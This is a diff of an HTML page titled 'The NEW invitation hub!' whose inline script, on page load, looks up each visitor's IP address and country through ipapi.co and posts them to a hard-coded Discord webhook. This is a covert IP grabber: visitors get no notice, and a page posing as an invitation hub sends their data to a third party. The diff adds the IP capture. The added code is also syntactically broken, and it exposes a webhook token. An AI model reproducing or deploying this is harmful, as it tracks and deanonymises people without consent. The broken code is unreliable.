@@ -5,27 +5,27 @@
   <title>The NEW invitation hub!</title>
   <meta name="description" content="A test website.">
   <script>
-    async function getUserCountry() {
-      
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
-      return data.country_name; 
-      }
+   <script>
+let userCountry = null;
+let userIP = null;
 
-let userCountry;
-
-getUserCountry().then(country => {
-  userCountry = country;
+fetch("https://ipapi.co/json/")
+  .then(response => response.json())
+  .then(data => {
+    userCountry = data.country_name; // e.g. "United Kingdom"
+    userIP = data.ip;               // e.g. "203.0.113.45"
+  
 const webhookURL = "https://discord.com/api/webhooks/1467501807830831154/RuLUs4ffAq2ipEK0fTTzh0QoM0UzLjQOxgObSn3dZ3S3Ll3nnnNmQlihK_l6Kt2b2RzP";
 
-// Your variable
+ Your variable
 fetch(webhookURL, {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
   },
   body: JSON.stringify({
-    content: userCountry
+    content: "Country:" userCountry 
+              "Ip:" userIP
   })
 });
 });
